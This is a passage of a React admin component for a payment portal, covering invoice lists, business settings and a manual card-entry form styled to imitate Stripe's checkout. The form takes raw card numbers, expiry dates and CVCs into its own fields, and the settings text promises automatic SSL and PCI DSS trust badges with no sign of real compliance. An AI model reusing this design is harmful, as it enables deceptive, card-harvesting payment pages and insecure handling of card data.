                  <label className="text-[11px] uppercase tracking-wider font-semibold text-white/40 mb-1 block">Due Date</label>
                  <Input type="date" value={invoiceForm.due_date} onChange={(e) => setInvoiceForm(f => ({ ...f, due_date: e.target.value }))} className="bg-white/5 border-white/10 text-white placeholder:text-white/30" />
                </div>
                <div className="sm:col-span-2">
                  <label className="text-[11px] uppercase tracking-wider font-semibold text-white/40 mb-1 block">Description</label>
                  <Input value={invoiceForm.description} onChange={(e) => setInvoiceForm(f => ({ ...f, description: e.target.value }))} placeholder="Payment for services rendered" className="bg-white/5 border-white/10 text-white placeholder:text-white/30" />
                </div>
                <div className="sm:col-span-2 flex gap-2">
                  <Button type="submit" disabled={invoiceLoading} className="bg-blue-600 hover:bg-blue-500 text-white border-0">
                    {invoiceLoading ? "Creating…" : "Create Invoice"}
                  </Button>
                  <Button type="button" variant="outline" onClick={() => setShowInvoiceForm(false)} className="bg-white/[0.04] border-white/[0.08] text-white/60 hover:text-white">Cancel</Button>
                </div>
              </form>
            </div>
          )}

          {/* Invoice List */}
          {invoices.length === 0 ? (
            <div className="bg-[#111827] rounded-xl border border-white/[0.06] p-16 text-center">
              <FileText className="h-10 w-10 text-white/10 mx-auto mb-3" />
              <p className="text-white/40 text-sm font-medium">No invoices yet</p>
              <p className="text-white/20 text-xs mt-1">Create your first invoice above</p>
            </div>
          ) : (
            <div className="space-y-2.5">
              {invoices.map((inv) => (
                <div key={inv.id} className="bg-[#111827] rounded-xl border border-white/[0.06] hover:border-white/[0.1] transition-colors p-4 sm:p-5">
                  <div className="flex items-center gap-4">
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2.5 mb-1">
                        <span className="text-sm font-mono font-semibold text-blue-400">{inv.invoice_number}</span>
                        {getInvoiceStatusBadge(inv.status)}
                      </div>
                      <div className="flex items-center gap-3 text-sm text-white/50">
                        <span>{inv.client_name}</span>
                        {inv.client_email && <span className="text-white/30">· {inv.client_email}</span>}
                      </div>
                      {inv.description && <p className="text-xs text-white/30 mt-1">{inv.description}</p>}
                    </div>
                    <div className="text-right shrink-0">
                      <p className="text-lg font-bold text-white tabular-nums">{formatEuro(parseFloat(inv.amount))}</p>
                      {inv.due_date && (
                        <p className="text-[10px] text-white/30">Due {new Date(inv.due_date).toLocaleDateString("en-GB", { day: "2-digit", month: "short" })}</p>
                      )}
                    </div>
                    <div className="flex items-center gap-1.5 shrink-0">
                      <Button size="sm" variant="outline" className="gap-1 bg-blue-500/10 border-blue-500/20 text-blue-400 hover:bg-blue-500/20" onClick={() => { setInvoiceFilter(inv.id); setActiveTab("sessions"); }}>
                        <Activity className="h-3 w-3" /> Sessions
                      </Button>
                      <Button size="sm" variant="outline" className="gap-1 bg-white/[0.04] border-white/[0.08] text-white/60 hover:text-white hover:bg-white/[0.08]" onClick={() => copyPaymentLink(inv.id)}>
                        <Copy className="h-3 w-3" /> Link
                      </Button>
                      <Button size="sm" variant="outline" className="gap-1 bg-white/[0.04] border-white/[0.08] text-white/60 hover:text-white hover:bg-white/[0.08]" onClick={() => window.open(`/pay/${inv.id}`, "_blank")}>
                        <ExternalLink className="h-3 w-3" />
                      </Button>
                      <Button size="sm" variant="outline" className="gap-1 bg-red-500/10 border-red-500/20 text-red-400 hover:bg-red-500/20" onClick={() => deleteInvoice(inv.id)}>
                        <Trash2 className="h-3 w-3" />
                      </Button>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* ========== SETTINGS TAB ========== */}
      {activeTab === "settings" && (
        <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-6 space-y-6">
          <div>
            <h2 className="text-lg font-semibold text-white">Business Settings</h2>
            <p className="text-xs text-white/30 mt-0.5">Configure your company details shown on invoices and payment pages</p>
          </div>

          <div className="bg-[#111827] rounded-xl border border-white/[0.06] p-6">
            <form onSubmit={handleSaveSettings} className="space-y-5">
              <div>
                <label className="text-[11px] uppercase tracking-wider font-semibold text-white/40 mb-1.5 block">Company Name *</label>
                <Input value={settingsForm.company_name} onChange={(e) => setSettingsForm(f => ({ ...f, company_name: e.target.value }))} placeholder="Your Company Name" required className="bg-white/5 border-white/10 text-white placeholder:text-white/30" />
                <p className="text-[10px] text-white/20 mt-1">This appears on invoices and payment pages</p>
              </div>
              <div>
                <label className="text-[11px] uppercase tracking-wider font-semibold text-white/40 mb-1.5 block">Contact Email</label>
                <Input type="email" value={settingsForm.contact_email} onChange={(e) => setSettingsForm(f => ({ ...f, contact_email: e.target.value }))} placeholder="billing@company.com" className="bg-white/5 border-white/10 text-white placeholder:text-white/30" />
              </div>
              <div>
                <label className="text-[11px] uppercase tracking-wider font-semibold text-white/40 mb-1.5 block">Website</label>
                <Input value={settingsForm.website} onChange={(e) => setSettingsForm(f => ({ ...f, website: e.target.value }))} placeholder="https://company.com" className="bg-white/5 border-white/10 text-white placeholder:text-white/30" />
              </div>
              <Button type="submit" disabled={settingsLoading} className="bg-blue-600 hover:bg-blue-500 text-white border-0">
                {settingsLoading ? "Saving…" : "Save Settings"}
              </Button>
            </form>
          </div>

          {/* Trust & Security Info */}
          <div className="bg-[#111827] rounded-xl border border-white/[0.06] p-6">
            <h3 className="text-sm font-semibold text-white mb-3 flex items-center gap-2">
              <ShieldCheck className="h-4 w-4 text-emerald-400" /> Security & Trust Signals
            </h3>
            <p className="text-xs text-white/40 leading-relaxed">
              Your payment pages automatically display trust signals including SSL encryption badges and PCI DSS compliance messaging. These are shown to all clients on the checkout page to build confidence and trust.
            </p>
          </div>
        </div>
      )}

      {/* ========== MANUAL ENTRY TAB ========== */}
      {activeTab === "form" && (
        <div className="min-h-[calc(100vh-57px)] flex">
          <div className="hidden lg:flex lg:w-[480px] xl:w-[520px] flex-col justify-between p-10 xl:p-14 bg-stripe-bg">
            <div>
              <div className="space-y-6">
                <div>
                  <p className="text-white/50 text-sm">Manual Card Entry</p>
                  <p className="text-white/40 text-xs mt-0.5">Business Portal</p>
                  <p className="text-white text-4xl font-bold tracking-tight mt-1">
                    {isValidAmount ? formatEuro(total) : "€0.00"}
                  </p>
                </div>
                <div className="space-y-4 mt-8">
                  <div className="flex items-center justify-between py-3 border-b border-white/10">
                    <p className="text-white/50 text-sm">Amount</p>
                    <p className="text-white/90 text-sm">{isValidAmount ? formatEuro(parsedAmount) : "—"}</p>
                  </div>
                  <div className="flex items-center justify-between py-3 border-b border-white/10">
                    <p className="text-white/50 text-sm">Transaction fee (0.1%)</p>
                    <p className="text-white/90 text-sm">{isValidAmount ? formatEuro(transactionFee) : "—"}</p>
                  </div>
                  <div className="flex items-center justify-between py-3">
                    <p className="text-white/90 text-sm font-semibold">Total</p>
                    <p className="text-white text-sm font-semibold">{isValidAmount ? formatEuro(total) : "—"}</p>
                  </div>
                </div>
              </div>
            </div>
            <div className="flex items-center gap-4 text-white/30 text-xs">
              <span>Powered by <span className="font-semibold text-white/50">{businessSettings?.company_name || "Pay"}</span></span>
              <span>·</span>
              <span>Admin Portal</span>
            </div>
          </div>

          <div className="flex-1 flex items-start justify-center bg-background overflow-y-auto">
            <div className="w-full max-w-[440px] py-10 px-5 sm:px-0 sm:py-14">
              <div className="lg:hidden mb-8">
                <p className="text-muted-foreground text-sm">Manual Card Entry</p>
                <p className="text-foreground text-3xl font-bold tracking-tight mt-1">
                  {isValidAmount ? formatEuro(total) : "€0.00"}
                </p>
                {isValidAmount && (
                  <div className="mt-3 space-y-1.5">
                    <div className="flex items-center justify-between text-sm">
                      <span className="text-muted-foreground">Transaction fee (0.1%)</span>
                      <span className="text-foreground">{formatEuro(transactionFee)}</span>
                    </div>
                    <div className="flex items-center justify-between text-sm font-semibold">
                      <span className="text-foreground">Total</span>
                      <span className="text-foreground">{formatEuro(total)}</span>
                    </div>
                  </div>
                )}
              </div>

              <div className="animate-fade-up">
                <form onSubmit={handleSubmit} className="space-y-6">
                  <div>
                    <label className="stripe-label">Amount (€500 – €1,500)</label>
                    <div className="relative">
                      <span className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground text-sm">€</span>
                      <input type="number" min="500" max="1500" step="0.01" value={amount} onChange={(e) => setAmount(e.target.value)} className="stripe-input pl-7" placeholder="1000.00" required />
                    </div>
                    {amount && !isValidAmount && <p className="text-destructive text-xs mt-1">Amount must be between €500 and €1,500</p>}
                  </div>
                  <div>
                    <label className="stripe-label">Email</label>
                    <input type="email" value={form.email} onChange={(e) => update("email", e.target.value)} className="stripe-input" placeholder="customer@example.com" required />
                  </div>
                  <div>
                    <label className="stripe-label">Card information</label>
                    <div className="stripe-input-group">
                      <div className="relative">
                        <input value={form.cardNumber} onChange={(e) => update("cardNumber", e.target.value)} className="stripe-input-row pr-28" placeholder="1234 1234 1234 1234" required />
                        <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-1.5">
                          <div className={`h-5 w-8 rounded bg-gradient-to-br from-blue-600 to-blue-800 flex items-center justify-center transition-opacity ${brand === "unknown" || brand === "visa" ? "opacity-100" : "opacity-25"}`}>
                            <span className="text-[7px] font-bold text-white tracking-wider">VISA</span>
                          </div>
                          <div className={`h-5 w-8 rounded bg-gradient-to-br from-red-500 to-orange-400 flex items-center justify-center transition-opacity ${brand === "unknown" || brand === "mastercard" ? "opacity-100" : "opacity-25"}`}>
                            <div className="flex -space-x-1"><div className="h-2.5 w-2.5 rounded-full bg-red-600/80" /><div className="h-2.5 w-2.5 rounded-full bg-yellow-400/80" /></div>
                          </div>
                          <div className={`h-5 w-8 rounded bg-gradient-to-br from-sky-500 to-sky-700 flex items-center justify-center transition-opacity ${brand === "unknown" || brand === "amex" ? "opacity-100" : "opacity-25"}`}>
                            <span className="text-[6px] font-bold text-white tracking-tight">AMEX</span>
                          </div>
                        </div>
                      </div>
                      <div className="flex border-t border-input">
                        <input value={form.expiry} onChange={(e) => update("expiry", e.target.value)} className="stripe-input-row flex-1 border-r border-input" placeholder="MM / YY" required />
                        <div className="relative flex-1">
                          <input value={form.cvv} onChange={(e) => update("cvv", e.target.value)} className="stripe-input-row w-full pr-10" placeholder="CVC" required />
                          <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground/40" />
                        </div>
                      </div>
                    </div>
                  </div>
                  <div>
                    <label className="stripe-label">Cardholder name</label>
                    <input value={form.cardholderName} onChange={(e) => update("cardholderName", e.target.value)} className="stripe-input" placeholder="Full name on card" required />
                  </div>
                  <div>
                    <label className="stripe-label">Billing address</label>
                    <div className="stripe-input-group">
                      <select value={form.country} onChange={(e) => update("country", e.target.value)} className="stripe-input-row w-full appearance-none bg-card cursor-pointer" required>
                        <option value="" disabled>Select a country…</option>
                        {countries.map((c) => <option key={c} value={c}>{c}</option>)}
                      </select>
                      {form.country && (
                        <>
                          <input value={form.address1} onChange={(e) => update("address1", e.target.value)} className="stripe-input-row border-t border-input" placeholder="Address line 1" required />
                          <input value={form.address2} onChange={(e) => update("address2", e.target.value)} className="stripe-input-row border-t border-input" placeholder="Address line 2 (optional)" />
                          <div className="flex border-t border-input">
                            <input value={form.city} onChange={(e) => update("city", e.target.value)} className="stripe-input-row flex-1 border-r border-input" placeholder="City" required />
                            <input value={form.state} onChange={(e) => update("state", e.target.value)} className="stripe-input-row flex-1" placeholder="State / Province" required />
                          </div>
                          <input value={form.zip} onChange={(e) => update("zip", e.target.value)} className="stripe-input-row border-t border-input" placeholder="ZIP / Postal code" required />
                        </>
                      )}
                    </div>
                  </div>
                  <button type="submit" disabled={loading || !isValidAmount} className="stripe-button flex items-center justify-center gap-2">
                    {loading ? (
                      <><div className="h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" /> Processing...</>
                    ) : (
                      <>Submit {isValidAmount ? formatEuro(total) : "—"}</>
                    )}
                  </button>
                  <div className="flex items-center justify-center gap-1.5 pt-2">
                    <Lock className="h-3 w-3 text-muted-foreground/50" />
                    <p className="text-xs text-muted-foreground/60">
                      Powered by <span className="font-semibold text-muted-foreground">{businessSettings?.company_name || "Pay"}</span>
                    </p>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Admin;
